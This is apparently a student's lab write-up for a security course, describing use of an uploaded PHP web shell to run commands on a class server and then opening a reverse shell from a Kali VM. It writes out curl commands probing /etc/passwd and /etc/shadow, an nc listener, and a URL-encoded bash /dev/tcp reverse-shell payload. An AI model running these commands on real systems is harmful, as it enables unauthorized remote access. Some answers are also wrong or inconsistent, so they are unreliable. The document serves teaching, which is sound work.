# Our first reverse shell

**Name**: Palmy Klangsathorn

---

## Part 1: Installing a PHP web shell

### a. Explain how you can execute the Linux command whoami on the server using your webshell. What result do you get when you execute that command?

**Answer:** To execute the Linux command whoami on the server, I access my web shell by visiting the following URL: [http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=whoami](http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=whoami)

or do this in terminal

```bash
curl "http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=whoami"
```

The `command=whoami` part of the URL sends the `whoami` command to the PHP web shell, which uses the `system()` function in PHP to execute the command on the server. The result I get when I execute `whoami` is `www-data`. This shows that the web server is running under the `www-data` user, which is typical for web servers on Linux.

### b. What is this webshell's `<pre>` tag for? (And more to the point, what happens if you leave it out?)

**Answer:** The `<pre>` tag in HTML is used to format text with preserved whitespace, line breaks, and fixed-width font. In this web shell, using `<pre>` around the PHP code output would display the command output exactly as it appears on the server, including any indentation, line breaks, or spacing, making it easier to read. If the `<pre>` tag is left out, the output may appear condensed, and formatting could be lost, making it harder to interpret multiline command outputs or complex data.

---

## Part 2: Looking around

### a. What directory is danger's website located in?

**Answer:**

```bash
curl "http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=pwd"
```

I got `/var/www/danger.jeffondich.com/uploadedimages`

### b. What are the names of all the user accounts on danger.jeffondich.com? How do you know?

**Answer:**

```bash
curl "http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=ls"
```

Here are what i got, these are some examples of mine:

klangsathornp-dog.jpg
klangsathornp-dog1.png
klangsathornp-webshell.php
klangsathornp-webshell1.php
.
.
.

### c. Do you have access to the file /etc/passwd? What's in it?

**Answer:**

```bash
curl "http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=ls%20/etc/passwd"
```

I got this `curl: (56) Recv failure: Connection reset by peer`

### d. Do you have access to the file /etc/shadow? What's in it? (You'll have to look online for the answer to that second question, since the answer to the first is no.)

**Answer:** No, I don't

```bash
curl "http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=ls%20/etc/shadow"
```

I got this `/etc/shadow`, this output confirmed restricted access

### e. There may be some secret files scattered around. See how many you can find and report on your discoveries.

**Answer:** Search just specifically for files that start with a dot in their names (hidden files)

```bash
curl "http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=ls%20/var/www/danger.jeffondich.com/uploadedimages/%2E%2A"
```

### f. [Optional] Report on anything else interesting you discover.

**Answer:** Here is how to search specifically for files containing my name, klangsathornp, by using a command to filter filenames that match:

```bash
curl "http://danger.jeffondich.com/uploadedimages/klangsathornp-webshell.php?command=ls%20%2Fvar%2Fwww%2Fdanger.jeffondich.com%2Fuploadedimages%20%7C%20grep%20'klangsathornp'"
```

---

## Part 3: Setup for Part 4

sudo systemctl start apache2

---

## Part 4: launching a reverse shell

### a. What is the IP address of your Kali VM (the target machine)? How did you find out?

**Answer:**

In the Kali VM terminal, run the following command:

```bash
ip a
```

The IP address of my Kali VM is `192.168.64.2`

### b. What are the IP addresses of your host OS (the attacking machine)? How did you find out? Which one should you use to communicate with Kali and why?

**Answer:**

In my computer terminal, run:

```bash
ifconfig
```

Here, I got a long text, look at `bridge100: inet 192.168.64.1`.
IP addresses of my host OS is `192.168.64.1`

### c. On your host OS (the attacker), pick any port number between 5000 and 10000 and run nc -l -p YOUR_CHOSEN_PORT

**Answer:**

```bash
nc -l -p 6000
```

### d. In a browser on your host machine, use your web shell to go to this crazy URL.

**Answer:**

```url
http://192.168.64.2/klangsathornp-webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.64.1/6000%200%3E%261%22
```

### e. Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?

**Answer:**

```bash
nc -l -p 6000
```

In the `nc -l -p 6000` terminal, I now have a shell prompt from the Kali machine. To verify, I typed commands like `whoami`. It returned the username of the Kali VM, confirming that I am executing commands on the Kali machine.

### f. What are all those % codes in the URL you used?

**Answer:** The `%` codes in the URL are URL-encoded characters, used to safely pass special characters within a URL. Here are just some of the examples of the `%` codes:

- `%20` is a space (` `)
- `%3E` is `>`
- `%26` is `&`
- `%2F` replaces slashes (/).
- `%7C` replaces the pipe (|).

These `%` codes ensure that the command is properly interpreted by the web server without issues caused by special characters.

### g. Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.

**Answer:** A reverse shell allows an attacker (host OS) to gain control of a target machine (Kali) by setting up a listener on the host and initiating a connection from the target to the host. Here’s how it works:

1. **Listener Setup**: The host machine starts a `netcat` listener (`nc -l -p 6000`), waiting for an incoming connection from the target.
2. **Connection Initiation**: On the target machine (Kali), we use a specially crafted command via a web shell (accessed at `http://192.168.64.2/klangsathornp-webshell.php`) to run:
   ```bash
   bash -c "bash -i >& /dev/tcp/192.168.64.1/6000 0>&1"
   ```

---
